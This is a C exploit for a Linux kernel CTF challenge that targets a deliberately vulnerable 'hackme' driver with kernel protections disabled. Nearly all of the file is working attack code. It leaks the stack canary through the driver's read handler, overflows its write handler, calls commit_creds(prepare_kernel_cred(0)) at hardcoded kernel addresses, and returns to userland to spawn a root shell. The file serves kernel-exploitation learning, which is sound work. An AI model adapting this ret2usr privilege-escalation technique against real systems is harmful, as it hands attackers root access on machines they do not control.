/* Exploit EXTREMALY based on lkmidas blog post
 *  
 * Basicaly this is a easy linux kernel challange without
 * any kernel protection (nopti nosmep nokaslr).
 * 
 * The vulnerable driver is the hackme.ko, if you decompile
 * this you can see 2 vulnerable functions "hackme_read()" 
 * and "hackme_write()", in this exploit we will use this
 * to leak the stackcookie, run the function "commit_creds(prepare_kernel_cred(0))"
 * and return to userland with the RIP pointing to /bin/sh with a root shell.
 * 
 * If you want to read more about that:
 * https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
 * 
 */

#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int module;
unsigned long canary;
unsigned long user_cs, user_ss, user_sp, user_rflags;

void push_flags(){
  /*
   *  Save the userland flags (Use this in others kernel exploits) 
   */
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
   );
    puts("[*] Saved userland flags cs|ss|rsp|rflags");
}

void open_hackme(){
  module = open("/dev/hackme", O_RDWR);
  if(module < 0)
    puts("[-] Module didnt opened successful :(");
  else
    puts("[+] Module opened successful :)");
}

void leak(){
  /*  Variables of decompiled code of hackme_read();
   *    int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
   *    unsigned __int64 v9; // [rsp+80h] [rbp-20h] (StackCookie)
   *    ...
   *    _memcpy(hackme_buf, tmp);
   *    ...
   */
  long unsigned buf[(unsigned)17];
  read(module,buf,sizeof(buf));
  canary = buf[16];
  printf("[*] 0x%lx\n",canary);
}

/*
 *  Point the RIP to /bin/sh so, when the RIP is 
 *  pushed in userland the shell is poped
 */
void bin_sh(){
  system("/bin/sh");
}
unsigned long user_rip = (unsigned long)bin_sh;

void privesc(){
  /*  commit_creds(prepare_kernel_cred(0))
   *    When KASLR is disabled you can use /proc/kallsysms to find the 
   *    address of this functions.
   *    -- addresses --
   *    / # cat /proc/kallsyms | grep commit_creds
   *    ffffffff814c6410 T commit_creds
   *    / # cat /proc/kallsyms | grep prepare_kernel_cred
   *    ffffffff814c67f0 T prepare_kernel_cred
   */
  __asm__(
      ".intel_syntax noprefix;"
      "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
      "xor rdi, rdi;"
      "call rax; mov rdi, rax;"
      "movabs rax, 0xffffffff814c6410;" //commit_creds
      "call rax;"
      // Return to userland with all original registers values 
      "swapgs;"
      "mov r15, user_ss;"
      "push r15;"
      "mov r15, user_sp;"
      "push r15;"
      "mov r15, user_rflags;"
      "push r15;"
      "mov r15, user_cs;"
      "push r15;"
      "mov r15, user_rip;"
      "push r15;"
      "iretq;"
      ".att_syntax;"
  );
}

void overflow(){
  long unsigned buf[(unsigned)21]; 
  buf[16] = canary; // canary location
  buf[17] = 0; // rbx
  buf[18] = 0; // r12
  buf[19] = 0; // rbp
  buf[20] = (unsigned long)privesc; // ret
  puts("[*]Got overflowed");
  write(module, buf, sizeof(buf));
  puts("[*] I am in B)"); // this should not print
}

int main(void){
  push_flags();
  open_hackme();
  leak();
  overflow();
  return 0;
}